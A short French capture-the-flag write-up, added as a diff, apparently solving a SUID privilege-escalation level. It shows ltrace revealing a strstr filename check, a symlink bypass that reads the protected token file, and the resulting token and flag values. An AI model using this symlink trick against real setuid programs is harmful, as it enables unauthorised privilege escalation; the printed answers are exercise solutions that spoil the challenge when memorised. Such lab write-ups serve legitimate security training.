@@ -1,0 +1,69 @@
+Nous voila avec 2 fichiers, level08 (qui est un executable) et token (qui est un fichier a permission élevé donc quasi inutilisable)
+
+On execute level08 il prend un argument visiblement
+
+On comprend que ca sera token et qu'il va falloir l'exploiter.
+
+Lorsque l'on fait ls  -la voila le resultat:
+
+-- ls -la -- 
+dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
+d--x--x--x  1 root    users    340 Aug 30  2015 ..
+-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
+-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
+-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
+-r-x------  1 level08 level08  675 Apr  3  2012 .profile
+-rw-------  1 flag08  flag08    26 Mar  5  2016 token
+
+
+On voit que level08 est owned par flag08 et que le SUID est activé. On va donc essayer de l'exploiter.
+
+On va donc essayer de faire un symlink du fichier token vers /tmp/token
+
+On va donc faire un ln -s /home/user/level08/token /tmp/token
+
+On va ensuite lancer level08 /tmp/token
+
+Voila le resultat:
+
+-- level08 /tmp/token --
+
+** Sortie :
+You may not access '/tmp/token'
+**
+
+on fait lstrace pour voir les appels systemes et librairies utilisées :
+
+-- ltrace level08 /tmp/token --
+
+** Sortie :
+strstr("/tmp/token", "token")                                                                              = "token"
+printf("You may not access '%s'\n", "/tmp/token"You may not access '/tmp/token'
+)                                                          = 32
+exit(1 <unfinished ...>
++++ exited (status 1) +++
+**
+
+On voit que le programme utilise la fonction strstr pour verifier si le mot token est present dans le chemin du fichier.
+
+On va donc essayer de faire un symlink vers /tmp/linker
+
+On va donc faire un ln -s /home/user/level08/token /tmp/linker
+
+On va ensuite lancer level08 /tmp/linker
+
+-- level08 /tmp/linker --
+
+** Sortie :
+quif5eloekouj29ke0vouxean
+**
+
+On a notre flag !
+
+-- su flag08 --
+
+-- getflag --
+
+** Sortie :
+25749xKZ8L7DkSCwJkT9dyv6f
+**
